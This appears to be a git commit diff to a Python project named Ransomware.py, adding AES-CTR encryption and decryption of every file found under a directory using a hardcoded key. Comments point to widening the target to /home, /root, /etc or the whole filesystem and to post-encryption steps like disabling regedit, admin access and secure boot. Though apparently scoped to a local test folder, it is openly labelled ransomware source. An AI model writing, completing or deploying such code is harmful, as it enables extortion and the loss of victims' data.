baf1d973cdb12aa2bc4318136fc33231681308eb
Filipe Teixeira <filipebarrosteixeira98@gmail.com>
2021-10-07 05:14:55 -0300

    feat(Ransomware): add encryption/decryption

--- Ransomware.py
+++ Ransomware.py
@@ -7,7 +7,7 @@ import os
 import Discovery
 import Crypter
 
-HARDCODED_KEY = 'hackware strike force strikes u!'
+HARDCODED_KEY = '951638064becf001cd04be8a38d02d6a62ab6a6c59a79dd351a76c91ff3a8989'  # SHA256 cryptography function (secure hash algorithm)
 
 
 def get_parser():
@@ -35,3 +35,31 @@ def main():
     else:
         if HARDCODED_KEY:
             key = HARDCODED_KEY
+
+    ctr = Counter.new(128)
+    crypt = AES.new(key, AES.MODE_CTR,
+                    counter=ctr)  # (advanced encryption standard)
+
+    if not decrypt:
+        cryptFn = crypt.encrypt
+    else:
+        cryptFn = crypt.decrypt
+
+    init_path = os.path.abspath(os.path.join(os.getcwd(), 'files'))
+    startDirs = [
+        init_path
+    ]  # it might be /home, /root, /dev, /etc or even / which is root filesystem folder
+
+    for currentDir in startDirs:
+        for filename in Discovery.file_discover(currentDir):
+            Crypter.change_files(filename, cryptFn)
+
+    for _ in range(100):  # to clean up (asymmetric) public-key from memory
+        pass
+
+    if not decrypt:  # after encryption, it can change wallpaper, icons, disable regedit, admin, bios secure boot
+        pass
+
+
+if __name__ == '__main__':
+    main()
